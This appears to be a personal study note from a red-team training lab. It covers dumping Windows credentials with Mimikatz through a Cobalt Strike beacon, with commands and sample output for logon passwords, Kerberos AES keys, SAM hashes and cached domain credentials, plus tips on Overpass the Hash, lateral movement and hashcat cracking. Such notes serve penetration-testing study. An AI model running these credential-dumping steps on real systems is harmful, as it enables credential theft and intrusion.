---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #🧰
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🧰  

# [[Mimikatz]]  
___

## Description:
Mimikatz is infamous for being able to dump plaintext passwords or password hashes from memory.

This requires local admin privileges on the host.

## Installation
Buillt into CobaltStike



## Commands
Cobalt Strike also has a short-hand command for this called `logonpasswords`.

After dumping these credentials, go to **View > Credentials** to see a copy of them. Some of Cobalt Strike workflows (such as the right-click **Beacon > Access > MakeToken** dialog) can pull from this data model.


```
beacon> mimikatz sekurlsa::logonpasswords

Authentication Id : 0 ; 113277 (00000000:0001ba7d)
Session           : Interactive from 1
User Name         : jking
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 5/24/2021 9:00:11 AM
SID               : S-1-5-21-3263068140-2042698922-2891547269-1122
    msv :   
     [00000003] Primary
     * Username : jking
     * Domain   : DEV
     * NTLM     : 4ffd3eabdce2e158d923ddec72de979e
     * SHA1     : b081158da72409badae7b849d12097f2fa02c119
     * DPAPI    : 4180363cf5b2faa2130098adcb3a1db4
    tspkg : 
    wdigest :   
     * Username : jking
     * Domain   : DEV
     * Password : (null)
    kerberos :  
     * Username : jking
     * Domain   : DEV.CYBERBOTIC.IO
     * Password : (null)
    ssp :   
    credman :

```


### eKeys

This Mimikatz module will dump Kerberos encryption keys. Since most Windows services choose to use Kerberos over NTLM, leveraging these over NTLM hashes makes more sense for blending into normal authentication traffic.


The **aes256_hmac** and **aes128_hmac** (if available) fields are what we want to use with **Overpass the Hash**. These AES keys are not automatically populated into the Credential data model, but they can be added manually (**View > Credentials > Add**).

```
beacon> mimikatz sekurlsa::ekeys

Authentication Id : 0 ; 113277 (00000000:0001ba7d)
Session           : Interactive from 1
User Name         : jking
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 5/24/2021 9:00:11 AM
SID               : S-1-5-21-3263068140-2042698922-2891547269-1122

     * Username : jking
     * Domain   : DEV.CYBERBOTIC.IO
     * Password : (null)
     * Key List :
       aes256_hmac       a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1
       rc4_hmac_nt       4ffd3eabdce2e158d923ddec72de979e
       rc4_hmac_old      4ffd3eabdce2e158d923ddec72de979e
       rc4_md4           4ffd3eabdce2e158d923ddec72de979e
       rc4_hmac_nt_exp   4ffd3eabdce2e158d923ddec72de979e
       rc4_hmac_old_exp  4ffd3eabdce2e158d923ddec72de979e
```

### SAM (Security Account Manager)
The Security Account Manager (SAM) database holds the NTLM hashes of local accounts only. These can be extracted with `lsadump::sam`. If a common local admin account is being used with the same password across an entire environment, this can make it very trivial to move laterally.

```
beacon> mimikatz lsadump::sam

Domain : SRV-1
SysKey : 5d11b46a92921b8775ca574306ba5355
Local SID : S-1-5-21-4124990477-354564332-720757739

SAMKey : fb5c3670b47e5ecae21f328b12d3103c

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 12a427a6fdf69be4917d30afc633f6fd

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount
```

### Domain Cached Credentials
Domain Cached Credentials were designed for instances where domain credentials are required to logon to a machine, even whilst it's disconnected from the domain (think of a roaming laptop for example). The local device caches the domain credentials so authentication can happen locally, but these can be extracted and cracked offline to recover plaintext credentials.

Unfortunately, the hash format is not NTLM.

```
beacon> mimikatz lsadump::cache

Domain : SRV-1
SysKey : 5d11b46a92921b8775ca574306ba5355

Local name : SRV-1 ( S-1-5-21-4124990477-354564332-720757739 )
Domain name : DEV ( S-1-5-21-3263068140-2042698922-2891547269 )
Domain FQDN : dev.cyberbotic.io

Policy subsystem is : 1.14
LSA Key(s) : 1, default {2f242789-b6b3-dc42-0903-3e03acab0bc2}
  [00] {2f242789-b6b3-dc42-0903-3e03acab0bc2} c09ac7dd10900648ef451c40c317f8311a40184b60ca28ae78c9036315bf8983

* Iteration is set to default (10240)

[NL$1 - 2/25/2021 1:07:37 PM]
RID       : 00000460 (1120)
User      : DEV\bfarmer
MsCacheV2 : 98e6eec9c0ce004078a48d4fd03f2419

[NL$2 - 5/17/2021 2:00:46 PM]
RID       : 0000046e (1134)
User      : DEV\svc_mssql
MsCacheV2 : 3f903860f7b6861a702eb9d6509d9da6

[NL$3 - 5/17/2021 2:00:50 PM]
RID       : 00000462 (1122)
User      : DEV\jking
MsCacheV2 : 673e2fe26e26e79c58379168b79890f6
```

To crack these with [hashcat](https://hashcat.net/hashcat/), we need to transform them into the expected format. The [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) shows us it should be `$DCC2$<iterations>#<username>#<hash>`.




___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (04:06 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
